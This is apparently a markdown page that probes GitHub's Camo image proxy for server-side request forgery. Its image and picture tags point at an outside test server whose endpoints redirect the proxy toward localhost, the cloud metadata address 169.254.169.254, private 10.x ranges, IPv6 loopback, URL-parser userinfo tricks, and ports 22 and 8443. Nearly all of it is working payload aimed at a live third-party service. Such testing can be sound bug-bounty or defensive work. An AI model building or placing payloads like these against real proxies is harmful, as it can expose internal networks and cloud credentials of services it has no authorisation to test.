## GitHub Camo Probe (safe tests I own)

> All URLs point to my test box at `http://164.90.187.218:8080`.  
> These images are intentionally broken/slow/large to exercise the proxy.

### 1) Baseline fetch
<img alt="t1-basic" src="http://164.90.187.218:8080/ssrf-test-1-basic?nonce=1" />

### 2) Slow & Large (timeout/limits)
<img alt="t2-slow-30s" src="http://164.90.187.218:8080/ssrf-test-7-slow?duration=30&nonce=2" />
<img alt="t3-large-50mb" src="http://164.90.187.218:8080/ssrf-test-6-large?size=50&nonce=3" />

### 3) Redirect chains (what will camo follow?)
<!-- external->external (should follow) -->
<picture>
  <source srcset="http://164.90.187.218:8080/ssrf-test-5-redirect?step=1&nonce=4">
  <img alt="ext->ext" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
</picture>

<!-- external->internal (should be blocked if protections work) -->
<picture>
  <source srcset="http://164.90.187.218:8080/redirect-to-internal?case=localhost&nonce=5">
  <img alt="ext->127.0.0.1" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
</picture>

<picture>
  <source srcset="http://164.90.187.218:8080/redirect-to-internal?case=metadata&nonce=6">
  <img alt="ext->169.254.169.254" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
</picture>

<picture>
  <source srcset="http://164.90.187.218:8080/redirect-to-internal?case=rfc1918-10&nonce=7">
  <img alt="ext->10.0.0.1" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
</picture>

### 4) URL parser edge cases
<!-- userinfo trick: which host is honored? -->
<picture>
  <source srcset="http://164.90.187.218:8080/redirect-to-edge?case=userinfo-host-swap&nonce=8">
  <img alt="userinfo-host-swap" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
</picture>

<!-- IPv6 localhost -->
<picture>
  <source srcset="http://164.90.187.218:8080/redirect-to-edge?case=ipv6-loopback&nonce=9">
  <img alt="[::1]" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
</picture>

### 5) Non-standard ports (small sample; do not scan)
<picture>
  <source srcset="http://164.90.187.218:8080/redirect-to-port?port=22&nonce=10">
  <img alt="port-22" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
</picture>

<picture>
  <source srcset="http://164.90.187.218:8080/redirect-to-port?port=8443&nonce=11">
  <img alt="port-8443" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
</picture>
